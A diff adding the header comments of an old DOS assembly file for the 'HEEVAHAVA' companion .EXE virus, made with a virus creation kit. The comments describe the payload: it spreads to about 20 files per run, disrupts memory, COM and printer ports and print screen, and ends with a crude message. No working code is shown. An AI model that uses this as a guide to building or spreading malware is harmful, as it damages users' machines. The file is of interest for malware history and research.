@@ -1,0 +1,13 @@
+; HEEVAHAV.ASM -- HEEVAHAVA VIRUS
+; Created with Nowhere Man's Virus Creation Laboratory v1.00/TASM
+; Written by URNST KOUCH
+; This is a spawning virus I decided to take to the limit,
+; to step on the accelerator of the VCL, so to speak.
+; HEEVAHAVA virus is a 'companion' .EXE infector which will attempt
+; to infect almost 20 files anywhere on the disk every run. It will mess
+; with low RAM, beep the speaker, disable COM port 1, entangle LPT1 and LPT2,
+; nullify print screen and finally, when the disk is completely saturated
+; with HEEVAHAVA virus it will display the msg, "Only heeva-hava's get stuck
+; with the HEEVAHAVA virus!" Note: a 'heevahava' is a Pennsylvania
+; Dutch pejorative. Colloquially, it was the name given to the farmhand
+; given the job of holding the bull's pecker while semen was collected.
